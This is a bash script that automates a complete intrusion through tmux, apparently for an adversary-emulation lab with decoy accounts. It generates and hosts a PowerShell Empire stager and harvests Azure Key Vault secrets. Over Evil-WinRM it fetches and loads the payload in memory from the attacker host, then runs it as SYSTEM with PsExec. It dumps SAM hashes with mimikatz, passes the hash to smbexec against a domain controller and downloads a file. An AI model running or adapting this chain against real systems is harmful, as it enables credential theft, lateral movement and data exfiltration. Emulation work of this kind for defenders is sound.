#!/bin/bash

SESSION_NAME="Scenario-2"
LOG_BASE="/home/<local_administrator>/logs"


mkdir /home/<local_administrator>/payloads
mkdir $LOG_BASE


LOG_FILE0="$LOG_BASE/$SESSION_NAME-0.log"
LOG_FILE1="$LOG_BASE/$SESSION_NAME-1.log"
LOG_FILE2="$LOG_BASE/$SESSION_NAME-2.log"
LOG_FILE3="$LOG_BASE/$SESSION_NAME-3.log"
LOG_FILE4="$LOG_BASE/$SESSION_NAME-4.log"

tmux kill-session -t $SESSION_NAME
sleep 3
tmux new-session -d -s $SESSION_NAME

echo "" >  $LOG_FILE0
echo "" >  $LOG_FILE1
echo "" >  $LOG_FILE2
echo "" >  $LOG_FILE3
echo "" >  $LOG_FILE4

tmux pipe-pane -t $SESSION_NAME:0 'cat >> '"$LOG_FILE0"
tmux send-keys -t $SESSION_NAME:0 "sudo powershell-empire server"
sleep 2
tmux send-keys -t $SESSION_NAME:0 C-m
/home/<local_administrator>/wait_for_prompt.exp "http://0.0.0.0:1337" $SESSION_NAME:0

sleep 3

tmux new-window -t $SESSION_NAME -n "Empire Client"
tmux pipe-pane -t $SESSION_NAME:1 'cat >> '"$LOG_FILE1"

tmux send-keys -t $SESSION_NAME:1 "sudo powershell-empire client"
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/<local_administrator>/wait_for_prompt.exp "(Empire) >" $SESSION_NAME:1

sleep 3

tmux send-keys -t $SESSION_NAME:1 "uselistener http"
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/<local_administrator>/wait_for_prompt.exp "(Empire: uselistener/http) >" $SESSION_NAME:1

sleep 3

tmux send-keys -t $SESSION_NAME:1 "set Host http://<server_domain>:80"
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/<local_administrator>/wait_for_prompt.exp "(Empire: uselistener/http) >" $SESSION_NAME:1

sleep 3

tmux send-keys -t $SESSION_NAME:1 "set Port 80"
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/<local_administrator>/wait_for_prompt.exp "(Empire: uselistener/http) >" $SESSION_NAME:1

sleep 3

tmux send-keys -t $SESSION_NAME:1 "execute"
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/<local_administrator>/wait_for_prompt.exp "(Empire: uselistener/http) >" $SESSION_NAME:1

sleep 3

tmux send-keys -t $SESSION_NAME:1 "usestager windows_csharp_exe"
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/<local_administrator>/wait_for_prompt.exp "(Empire: usestager/windows_csharp_exe) >" $SESSION_NAME:1

sleep 3

tmux send-keys -t $SESSION_NAME:1 "set Listener http"
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/<local_administrator>/wait_for_prompt.exp "(Empire: usestager/windows_csharp_exe) >" $SESSION_NAME:1

sleep 3

tmux send-keys -t $SESSION_NAME:1 "set OutFile /home/<local_administrator>/payloads/Scenario2.exe"
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/<local_administrator>/wait_for_prompt.exp "(Empire: usestager/windows_csharp_exe) >" $SESSION_NAME:1

sleep 3

tmux send-keys -t $SESSION_NAME:1 "execute"
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/<local_administrator>/wait_for_prompt.exp "(Empire: usestager/windows_csharp_exe) >" $SESSION_NAME:1

sleep 3
cp /var/lib/powershell-empire/empire/client/generated-stagers/Scenario2.exe /home/<local_administrator>/payloads/Scenario2.exe



tmux new-window -t $SESSION_NAME -n "Hosting Payload Web Server"
tmux pipe-pane -t $SESSION_NAME:2 'cat >> '"$LOG_FILE2"
tmux send-keys -t $SESSION_NAME:2 "cd /home/<local_administrator>/payloads"
sleep 2
tmux send-keys -t $SESSION_NAME:2 C-m

sleep 3

tmux send-keys -t $SESSION_NAME:2 "python3 -m http.server 8081"
sleep 2
tmux send-keys -t $SESSION_NAME:2 C-m

sleep 3

tmux new-window -t $SESSION_NAME -n "Azure"
tmux pipe-pane -t $SESSION_NAME:3 'cat >> '"$LOG_FILE3"
tmux send-keys -t $SESSION_NAME:3 'cd /home/<local_administrator>; mkdir Scenario-2; cd Scenario-2'
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
sleep 3

tmux send-keys -t $SESSION_NAME:3 'az login -u <scenario2AzureUsername>@<entraIDDomain> -p <scenario2AzurePassword> --allow-no-subscriptions'
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
/home/<local_administrator>/wait_for_prompt.exp "(<local_administrator>" $SESSION_NAME:3

sleep 3

tmux send-keys -t $SESSION_NAME:3 'az keyvault list --query "[].name" -o tsv'
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
/home/<local_administrator>/wait_for_prompt.exp "(<local_administrator>" $SESSION_NAME:3

sleep 3

tmux send-keys -t $SESSION_NAME:3 'az keyvault secret list --vault-name "<scenario2VaultName>" --query "[].name" -o tsv'
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
/home/<local_administrator>/wait_for_prompt.exp "(<local_administrator>" $SESSION_NAME:3

sleep 3

tmux send-keys -t $SESSION_NAME:3 'az keyvault key list --vault-name "<scenario2VaultName>" --query "[].name" -o tsv'
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
/home/<local_administrator>/wait_for_prompt.exp "(<local_administrator>" $SESSION_NAME:3

sleep 3

tmux send-keys -t $SESSION_NAME:3 'az keyvault certificate list --vault-name "<scenario2VaultName>" --query "[].name" -o tsv'
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
/home/<local_administrator>/wait_for_prompt.exp "(<local_administrator>" $SESSION_NAME:3

sleep 3

tmux send-keys -t $SESSION_NAME:3 'az keyvault secret show --vault-name "<scenario2VaultName>" --name "<scenario2OnPremiseUser>" --query "value" -o tsv'
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
/home/<local_administrator>/wait_for_prompt.exp "(<local_administrator>" $SESSION_NAME:3

sleep 3

tmux send-keys -t $SESSION_NAME:3 'az keyvault secret show --vault-name "<scenario2VaultName>" --name "<scenario2DecoyUser>" --query "value" -o tsv'
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
/home/<local_administrator>/wait_for_prompt.exp "(<local_administrator>" $SESSION_NAME:3

sleep 3

tmux send-keys -t $SESSION_NAME:3 'az login -u <scenario2DecoyUsername>@<entraIDDomain> -p <scenario2DecoyPassword>'
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
/home/<local_administrator>/wait_for_prompt.exp "(<local_administrator>" $SESSION_NAME:3

sleep 3

tmux send-keys -t $SESSION_NAME:3 'az login -u <scenario2DecoyUsername>@<entraIDDomain> -p <scenario2DecoyPassword> --allow-no-subscriptions'
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
/home/<local_administrator>/wait_for_prompt.exp "(<local_administrator>" $SESSION_NAME:3

sleep 3

tmux new-window -t $SESSION_NAME -n "Evil-Winrm"
tmux pipe-pane -t $SESSION_NAME:4 'cat >> '"$LOG_FILE4"

tmux send-keys -t $SESSION_NAME:4 "evil-winrm -i <workstation_ip> -u '<scenario2Username>' -p '<scenario2Password>'"
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
/home/<local_administrator>/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:4

sleep 3

tmux send-keys -t $SESSION_NAME:4 "whoami"
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
/home/<local_administrator>/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:4

sleep 3

tmux send-keys -t $SESSION_NAME:4 "hostname"
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
/home/<local_administrator>/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:4

sleep 3

tmux send-keys -t $SESSION_NAME:4 'Set-Content -Path .\run.ps1 -Value "[System.Reflection.Assembly]::Load((Invoke-WebRequest -Uri http://<server_ip>:8081/Scenario2.exe -UseBasicParsing).Content).EntryPoint.Invoke([DBNull]::Value, @())" -Encoding UTF8'
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
/home/<local_administrator>/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:4

sleep 3

tmux send-keys -t $SESSION_NAME:4 'Invoke-WebRequest -Uri "https://download.sysinternals.com/files/PSTools.zip" -OutFile "C:\Users\<scenario2Username>\Documents\PSTools.zip"'
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
/home/<local_administrator>/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:4

sleep 3

tmux send-keys -t $SESSION_NAME:4 'Expand-Archive -Path "C:\Users\<scenario2Username>\Documents\PSTools.zip" -DestinationPath "C:\Users\<scenario2Username>\Documents"'
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
/home/<local_administrator>/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:4

sleep 3

tmux send-keys -t $SESSION_NAME:4 '.\PsExec.exe -s powershell.exe -ExecutionPolicy Bypass -File "C:\Users\<scenario2Username>\Documents\run.ps1" -accepteula'
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
/home/<local_administrator>/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:4

sleep 3

tmux select-window -t $SESSION_NAME:1

tmux send-keys -t $SESSION_NAME:1 "agents"
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/<local_administrator>/wait_for_prompt.exp "(Empire: agents) >" $SESSION_NAME:1

sleep 3

tmux send-keys -t $SESSION_NAME:1 "interact "
sleep 2

tmux send-keys -t $SESSION_NAME:1 Down
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/<local_administrator>/wait_for_prompt.exp "(Empire: " $SESSION_NAME:1

sleep 3
tmux send-keys -t $SESSION_NAME:1 "usemodule powershell_credentials_mimikatz_sam"
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/<local_administrator>/wait_for_prompt.exp "(Empire: usemodule/powershell_credentials_mimikatz_sam) >" $SESSION_NAME:1

sleep 3

tmux send-keys -t $SESSION_NAME:1 "execute"
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/<local_administrator>/wait_for_prompt.exp "(Empire: " $SESSION_NAME:1

sleep 15

hash=$(cat logs/Scenario-2-1.log | grep "<local_administrator>" -A1 | grep "NTLM" | awk '{print $3}')
echo $hash
# tmux select-window -t $SESSION_NAME:4

sleep 2


tmux send-keys -t $SESSION_NAME:1 "usemodule powershell_lateral_movement_invoke_smbexec"
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/<local_administrator>/wait_for_prompt.exp "(Empire: usemodule/powershell_lateral_movement_invoke_smbexec) >" $SESSION_NAME:1

sleep 3


tmux send-keys -t $SESSION_NAME:1 "set ComputerName <domainControllerName>"
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/<local_administrator>/wait_for_prompt.exp "(Empire: usemodule/powershell_lateral_movement_invoke_smbexec) >" $SESSION_NAME:1

sleep 3

tmux send-keys -t $SESSION_NAME:1 "set Username <local_administrator>"
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/<local_administrator>/wait_for_prompt.exp "(Empire: usemodule/powershell_lateral_movement_invoke_smbexec) >" $SESSION_NAME:1

sleep 3

tmux send-keys -t $SESSION_NAME:1 "set Hash $hash"
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/<local_administrator>/wait_for_prompt.exp "(Empire: usemodule/powershell_lateral_movement_invoke_smbexec) >" $SESSION_NAME:1

sleep 3

tmux send-keys -t $SESSION_NAME:1 "set Listener http"
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/<local_administrator>/wait_for_prompt.exp "(Empire: usemodule/powershell_lateral_movement_invoke_smbexec) >" $SESSION_NAME:1

sleep 3

tmux send-keys -t $SESSION_NAME:1 "execute"
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/<local_administrator>/wait_for_prompt.exp "(Empire: usemodule/powershell_lateral_movement_invoke_smbexec) >" $SESSION_NAME:1

sleep 3

agent=$(cat logs/Scenario-2-1.log | grep "checked in" | tail -1 | awk '{print $15}')
echo $agent

sleep 3

tmux send-keys -t $SESSION_NAME:1 "agents"
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/<local_administrator>/wait_for_prompt.exp "(Empire: agents) >" $SESSION_NAME:1

sleep 3

tmux send-keys -t $SESSION_NAME:1 "interact $agent"
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/<local_administrator>/wait_for_prompt.exp "(Empire: " $SESSION_NAME:1

sleep 3

tmux send-keys -t $SESSION_NAME:1 "shell"
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/<local_administrator>/wait_for_prompt.exp "(Empire: " $SESSION_NAME:1

sleep 3

tmux send-keys -t $SESSION_NAME:1 "dir C:\\Temp"
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/<local_administrator>/wait_for_prompt.exp "(Empire: " $SESSION_NAME:1

sleep 3

tmux send-keys -t $SESSION_NAME:1 "exit"
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/<local_administrator>/wait_for_prompt.exp "(Empire: " $SESSION_NAME:1

sleep 3

tmux send-keys -t $SESSION_NAME:1 'download "C:\Temp\<scenario2DecoyFile>"'
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m

echo "Reached the end."
